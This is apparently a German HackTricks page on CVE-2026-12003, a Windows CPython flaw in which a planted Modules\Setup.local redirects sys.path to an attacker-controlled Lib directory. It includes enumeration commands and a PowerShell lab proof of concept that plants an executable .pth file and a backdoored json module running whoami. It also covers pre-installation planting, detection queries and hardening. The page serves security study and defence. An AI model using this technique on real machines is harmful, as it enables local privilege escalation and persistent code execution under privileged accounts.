# Windows-CPython-Build-Landmark- und `sys.path`-Hijacking

{{#include ../../../banners/hacktricks-training.md}}

Eine Laufzeitumgebung kann relative Pfade beibehalten, die ursprünglich nur für ihren Build-Tree vorgesehen waren. Wenn eine installierte privilegierte Laufzeitumgebung einen dieser Pfade in ein von einem Benutzer mit niedrigen Privilegien beschreibbares Verzeichnis auflöst, kann ein Angreifer den erwarteten **Build-Landmark** platzieren und die Laufzeitumgebung dazu bringen, ein alternatives Bibliothekspräfix zu verwenden. CVE-2026-12003 ist ein Windows-CPython-Beispiel: Ein platziertes `Modules\Setup.local` kann den Standardbibliothek-Eintrag in `sys.path` umleiten, ohne die geschützte Python-Installation zu verändern.<sup>[[1]](#references)[[2]](#references)</sup>

## CPython-Pfadkonstruktionskette

Betroffene Windows-Builds wurden mit `VPATH=..\..` kompiliert und stellten diesen Wert als `sys._vpath` bereit. Der verwundbare Fallback in `Modules/getpath.py` behandelte `VPATH\Modules\Setup.local` als Hinweis darauf, dass der Interpreter aus einem Source-Tree ausgeführt wurde; der folgende Datenfluss wandelt diesen Build-Time-Wert in ein Runtime-Suchpfad-Primitive um.<sup>[[1]](#references)[[2]](#references)</sup>

| Stufe | Abgeleiteter Wert für `C:\Program Files\Python314\python.exe` |
| --- | --- |
| Kompilierter Build-Pfad | `VPATH=..\..` |
| Runtime-Build-Landmark | `C:\Program Files\Python314\..\..\Modules\Setup.local` |
| Vom Angreifer erstellter Landmark | `C:\Modules\Setup.local` |
| Ausgewähltes `build_prefix` | `C:\` |
| Ausgewählte Standardbibliothek | `C:\Lib` |
| Ergebnis | Das vom Angreifer kontrollierte `C:\Lib` wird an `sys.path` angehängt |

Die Prüfung ist ein Fallback, der verwendet wird, wenn die spezifischere `pybuilddir.txt` neben der ausführbaren Datei fehlt oder nicht lesbar ist. Das ist relevant, weil ein Benutzer mit niedrigen Privilegien möglicherweise nicht in der Lage ist, `C:\Program Files\Python314` zu ändern, aber dennoch neue Verzeichnisse unter `C:\` erstellen kann. Der spätere privilegierte `python.exe`-Prozess lädt Python-Code mit seinem eigenen Access Token.<sup>[[1]](#references)[[2]](#references)</sup>

### Voraussetzungen

Betrachte dies nur dann als Privilege Boundary, wenn alle folgenden Bedingungen erfüllt sind:<sup>[[1]](#references)[[2]](#references)</sup>

- Das Ziel ist ein betroffener **Windows-CPython**-Build; die verwundbare Pfadlogik ist keine Eigenschaft der Python-Sprache.
- Das Verzeichnis, das durch die Auflösung von `..\..` aus dem Verzeichnis mit `python.exe` entsteht, erlaubt es einem Benutzer mit niedrigeren Privilegien, den Landmark und den `Lib`-Tree zu erstellen.
- Ein Benutzer, ein Service, ein Installer oder ein Software-Deployment-Account mit höheren Privilegien startet diesen Interpreter später.
- Keine Path-Isolation-Konfiguration überschreibt den verwundbaren Discovery-Pfad.

## Enumeration

Untersuche sowohl den kompilierten Wert als auch den effektiven Suchpfad. Ein offengelegter Wert `..\..` ist ein nützlicher Hinweis, aber kein Beweis für die Exploitability: Löse den Pfad ebenfalls auf, prüfe die ACLs und bestätige, dass ein platzierter Landmark außerhalb der geschützten Installation liegen würde.<sup>[[1]](#references)[[2]](#references)</sup>
```powershell
python -c "import os,sys; print(sys.executable); print(getattr(sys,'_vpath',None)); print(*sys.path, sep='\n')"

$pythonDir = python -c "import os,sys; print(os.path.dirname(sys.executable))"
$prefix = [IO.Path]::GetFullPath((Join-Path $pythonDir '..\..'))
$prefix
icacls $prefix
```
Beschränken Sie die Untersuchung nicht auf offizielle Installer. Ermitteln Sie für jedes Produkt, das `python.exe` bündelt, den zugehörigen `sys._vpath` relativ zum tatsächlichen Verzeichnis der ausführbaren Datei und prüfen Sie die ACLs der daraus resultierenden `Modules`- und `Lib`-Verzeichnisse. Ein tieferer Installationspfad kann anstelle von `C:\` zu einem anderen beschreibbaren Anwendungs- oder Herstellerverzeichnis aufgelöst werden.<sup>[[1]](#references)</sup>

## Lab exploitation workflow

Der folgende Lab-PoC bildet unterhalb des ausgewählten Präfixes genügend von der legitimen Runtime nach, damit Python initialisiert werden kann, fügt eine ausführbare `.pth`-Zeile hinzu und erstellt schließlich den Landmark. Erstellen Sie das Payload vor dem Landmark, um zu vermeiden, dass der Interpreter vorübergehend auf einen unvollständigen Bibliotheksbaum verweist.<sup>[[1]](#references)</sup>
```powershell
$pythonDir = python -c "import os,sys; print(os.path.dirname(sys.executable))"
$root = [IO.Path]::GetFullPath((Join-Path $pythonDir '..\..'))
robocopy /E "$pythonDir\Lib" "$root\Lib" | Out-Null
robocopy /E "$pythonDir\DLLs" "$root\Lib" | Out-Null
New-Item "$root\Lib\site-packages" -ItemType Directory -Force | Out-Null
'import subprocess;subprocess.run(["cmd.exe","/c","whoami > %TEMP%\\py-landmark.txt"],shell=False)' |
Set-Content "$root\Lib\site-packages\audit.pth" -Encoding Ascii
New-Item "$root\Modules" -ItemType Directory -Force | Out-Null
New-Item "$root\Modules\Setup.local" -ItemType File -Force | Out-Null
```
Während der normalen Site-Initialisierung verarbeitet Python `.pth`-Dateien in erkannten site-packages-Verzeichnissen. Nur Zeilen, die mit `import` gefolgt von Whitespace beginnen, werden ausgeführt, und die ausführbare Anweisung muss in einer einzigen physischen Zeile bleiben; `python -S` unterdrückt den automatischen `site`-Import und damit diesen Trigger.<sup>[[1]](#references)[[4]](#references)</sup>

### Durch Import ausgelöste Alternative

Eine Ausführung beim Start ist nicht erforderlich. Nachdem der legitime Bibliotheksbaum nachgebildet wurde, kann ein Modul mit einer Backdoor versehen werden, das ein privilegiertes Skript erwartungsgemäß importiert. Beispielsweise wird durch das Hinzufügen von Code zur platzierten `Lib\json\__init__.py` dieser ausgeführt, wenn das Opfer `json` importiert; die Auswahl eines zuverlässigen, aber nicht universell importierten Moduls kann den Trigger weniger auffällig machen.<sup>[[1]](#references)</sup>
```powershell
'open(r"C:\Windows\Temp\json-import-token.txt","w").write(__import__("subprocess").check_output(["whoami"]).decode())' |
Add-Content "$root\Lib\json\__init__.py" -Encoding Ascii
```
Diese Variante erbt weiterhin das Token des importierenden Prozesses, hängt jedoch davon ab, dass die Zielanwendung das modifizierte Modul importiert. Bewahre beim Testen echter Software das Verhalten des ursprünglichen Moduls, da der Import andernfalls fehlschlagen kann, bevor der beabsichtigte privilegierte Workflow abgeschlossen ist.<sup>[[1]](#references)</sup>

## Pre-installation planting

Search-path planting kann der Installation vorausgehen. Ein Benutzer mit niedrigen Privilegien kann den zukünftigen `Lib`-Baum und `Modules\Setup.local` vorbereiten und anschließend warten, bis ein privilegiertes Softwareportal, ein Helpdesk-Workflow oder ein Deployment-System eine Installation für alle Benutzer durchführt. Installer, die den neuen Interpreter zum Installieren von Packages oder zum Vorkompilieren der Standardbibliothek starten, können den Payload unter dem Deployment-Konto auslösen, ohne dass ein Administrator Python manuell öffnen muss.<sup>[[1]](#references)</sup>

Dies verändert auch die Deployment-Prüfung: Überprüfe beschreibbare übergeordnete Verzeichnisse sowie bereits vorhandene Landmark-/Library-Verzeichnisse **vor** der Installation oder dem Upgrade einer gebündelten Runtime, anstatt erst nach dem Deployment nur das endgültige Installationsverzeichnis zu prüfen.<sup>[[1]](#references)</sup>

## Erkennung und Härtung

Nützliche Host-Pivots sind das unerwartete Landmark und der Library-Baum, gefolgt von einem privilegierten Python-Start. Suche nach `Modules\Setup.local`, `*.pth`-Dateien auf Root-Ebene oder an anderen ungewöhnlichen Stellen unter `Lib\site-packages`, kopierten Standardbibliothek-Packages sowie Moduldateien, deren Besitzer oder Erstellungszeitpunkt von der geschützten Installation abweicht. Korrelieren ihre Erstellung durch einen Standardbenutzer mit einem erhöhten `python.exe`, das `cmd.exe`, `powershell.exe`, Tools zur Kontoverwaltung oder andere ungewöhnliche Child-Prozesse startet.<sup>[[1]](#references)</sup>
```powershell
Get-Item C:\Modules\Setup.local -ErrorAction SilentlyContinue | Format-List FullName,CreationTime,LastWriteTime
Get-ChildItem C:\Lib\site-packages -Filter *.pth -ErrorAction SilentlyContinue |
Select-Object FullName,CreationTime,LastWriteTime
Get-ChildItem C:\Lib -Recurse -File -ErrorAction SilentlyContinue |
Get-Acl | Where-Object Owner -notmatch 'TrustedInstaller|Administrators|SYSTEM'
```
Der Upstream-Fix entfernt den Fallback `VPATH\Modules\Setup.local` und macht `pybuilddir.txt` zum alleinigen Indikator für den Build-Tree. Bevorzugt sollten ein fester Build oder eine per-user-Installation verwendet werden, die mit dem aktuellen Python install manager verwaltet wird. Wenn ein Upgrade vorübergehend nicht möglich ist, sollte der aufgelöste übergeordnete Pfad geschützt und `Modules` mit restriktiven ACLs vorab erstellt werden; kontrollierte `._pth`-Dateien oder `PYTHONHOME` können die Erkennung ebenfalls verändern, erfordern jedoch Kompatibilitätstests der Anwendung.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## References

- [1] [Bishop Fox - CVE-2026-12003: Windows CPython Search-Path-Hijacking und lokale Privilege Escalation](https://bishopfox.com/blog/python-software-foundation-python-3-11-0a3-to-3-15-0b2)
- [2] [CPython issue #151544 - In-tree-Suchpfade können aktiviert werden, ohne das Installationsverzeichnis zu ändern](https://github.com/python/cpython/issues/151544)
- [3] [CPython pull request #151545 - Den Fallback `VPATH/Modules/Setup.local` entfernen](https://github.com/python/cpython/pull/151545)
- [4] [Python documentation - `site`-Pfadkonfigurationsdateien](https://docs.python.org/3/library/site.html)
{{#include ../../../banners/hacktricks-training.md}}
